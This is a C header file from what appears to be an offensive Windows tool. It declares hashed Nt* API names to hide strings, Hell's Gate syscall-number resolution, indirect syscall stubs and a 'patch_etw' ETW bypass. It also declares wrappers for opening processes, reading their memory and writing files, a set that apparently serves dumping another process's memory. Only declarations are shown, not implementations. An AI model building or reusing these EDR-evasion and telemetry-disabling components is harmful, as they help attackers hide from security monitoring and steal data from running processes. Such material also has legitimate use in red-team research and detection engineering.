#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>
#include "ntdefs.h"

// DJB2 hashes of Nt* function names (no plaintext strings in binary)
#define H_NtOpenProcess              0x5003C058
#define H_NtClose                    0x8B8E133D
#define H_NtQueryVirtualMemory       0xE39D8E5D
#define H_NtReadVirtualMemory        0xC24062E3
#define H_NtQueryInformationProcess  0xD034FC62
#define H_NtCreateFile               0x15A5ECDB
#define H_NtWriteFile                0xD69326B2
#define H_NtQuerySystemInformation   0xEE4F73A8
#define H_NtProtectVirtualMemory     0x082962C8
#define H_EtwEventWrite              0x24A8D022

// Syscall numbers (resolved at runtime via Hell's Gate)
typedef struct _SYSCALL_TABLE {
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtQueryVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtQueryInformationProcess;
    DWORD NtCreateFile;
    DWORD NtWriteFile;
    DWORD NtQuerySystemInformation;
    DWORD NtProtectVirtualMemory;
} SYSCALL_TABLE;

// Address of `syscall` instruction in ntdll (for indirect calls)
typedef struct _SYSCALL_ADDR_TABLE {
    PVOID NtOpenProcess;
    PVOID NtClose;
    PVOID NtQueryVirtualMemory;
    PVOID NtReadVirtualMemory;
    PVOID NtQueryInformationProcess;
    PVOID NtCreateFile;
    PVOID NtWriteFile;
    PVOID NtQuerySystemInformation;
    PVOID NtProtectVirtualMemory;
} SYSCALL_ADDR_TABLE;

extern SYSCALL_TABLE g_ssn;
extern SYSCALL_ADDR_TABLE g_addr;

// Resolve all syscall numbers and addresses from ntdll
BOOL resolve_syscalls(void);

// Indirect syscall stubs (defined in syscalls.asm)
extern NTSTATUS indirect_syscall(DWORD ssn, PVOID syscall_addr, ...);

// Typed wrappers
NTSTATUS sys_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

NTSTATUS sys_NtClose(HANDLE Handle);

NTSTATUS sys_NtQueryVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    DWORD MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
);

NTSTATUS sys_NtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

NTSTATUS sys_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

NTSTATUS sys_NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

NTSTATUS sys_NtWriteFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

NTSTATUS sys_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// ETW bypass
BOOL patch_etw(void);

#endif // SYSCALLS_H
